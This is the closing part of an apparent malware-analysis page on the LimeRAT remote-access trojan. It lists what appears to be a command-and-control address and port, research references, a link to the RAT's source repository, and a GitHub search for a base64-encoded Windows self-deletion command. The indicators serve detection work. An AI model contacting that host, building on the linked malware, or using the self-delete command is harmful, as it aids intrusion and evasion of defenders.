- 138.201.81.121:39431

<br />
<hr />
<br />

## References

- [https://malpedia.caad.fkie.fraunhofer.de/details/win.limerat](https://malpedia.caad.fkie.fraunhofer.de/details/win.limerat)
- [https://yoroi.company/research/limerat-spreads-in-the-wild/](https://yoroi.company/research/limerat-spreads-in-the-wild/)
- [https://github.com/NYAN-x-CAT/Lime-RAT/](https://github.com/NYAN-x-CAT/Lime-RAT/)
- [https://www.trellix.com/en-us/about/newsroom/stories/research/targeted-attack-on-government-agencies.html](https://www.trellix.com/en-us/about/newsroom/stories/research/targeted-attack-on-government-agencies.html)
- [https://github.com/search?q="Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA%3D"&type=code](https://github.com/search?q=%22Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA%3D%22&type=code)

<hr />

<a href="#">Back to the top</a>
